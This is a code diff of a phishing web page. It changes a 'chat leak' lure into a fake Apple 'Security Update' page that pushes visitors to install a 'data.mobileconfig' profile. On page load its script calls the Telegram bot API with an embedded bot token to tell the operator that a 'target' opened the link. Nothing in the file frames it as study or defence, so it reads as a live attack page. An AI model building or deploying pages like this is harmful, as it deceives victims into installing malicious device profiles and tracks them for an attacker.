@@ -3,40 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Storage</title>
+    <title>System Security Update</title>
     <style>
-        body { margin: 0; padding: 0; background-color: #000; font-family: -apple-system, sans-serif; overflow: hidden; }
-        .preview { width: 100%; height: 100vh; display: flex; justify-content: center; align-items: center; }
-        .preview img { width: 100%; height: 100%; object-fit: contain; transition: filter 0.5s; }
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; justify-content: center; align-items: center; z-index: 10; }
-        .modal { background: #fff; width: 85%; max-width: 350px; padding: 25px; border-radius: 15px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
-        h3 { margin-top: 0; color: #d32f2f; font-size: 18px; }
-        p { color: #333; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
-        .btn { display: inline-block; background-color: #007AFF; color: white; text-decoration: none; padding: 14px 25px; border-radius: 10px; font-weight: bold; font-size: 16px; width: 80%; }
-        .btn:active { background-color: #0051a8; }
+        body { font-family: -apple-system, sans-serif; background: #f2f2f7; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 85%; max-width: 400px; }
+        img { width: 80px; margin-bottom: 20px; }
+        h1 { font-size: 22px; color: #1d1d1f; margin-bottom: 10px; }
+        p { color: #86868b; font-size: 14px; line-height: 1.5; }
+        .btn { background: #007aff; color: white; padding: 12px 25px; border-radius: 10px; text-decoration: none; display: inline-block; font-weight: 600; margin-top: 20px; }
     </style>
 </head>
 <body>
-
-    <div class="preview">
-        <img src="chat_preview.jpg" id="bgImg" alt="Chat Preview">
-    </div>
-
-    <div id="trap" class="overlay">
-        <div class="modal">
-            <h3>⚠️ Access Interrupted</h3>
-            <p>To view the full chat list and secure your leaked data, please install the mandatory verification profile.</p>
-            <a href="data.mobileconfig" class="btn">INSTALL NOW</a>
-        </div>
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+        <h1>Security Update</h1>
+        <p>A critical security update is required to maintain your encrypted database and secure chat storage.</p>
+        <a href="data.mobileconfig" class="btn">Install Update</a>
     </div>
 
     <script>
-    
-        setTimeout(function() {
-            document.getElementById('trap').style.display = 'flex';
-            document.getElementById('bgImg').style.filter = 'blur(8px)';
-        }, 5000);
+        window.onload = function() {
+            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Target_Opened_Link_🔥_Status_Waiting_for_Install");
+        };
     </script>
-
 </body>
 </html>
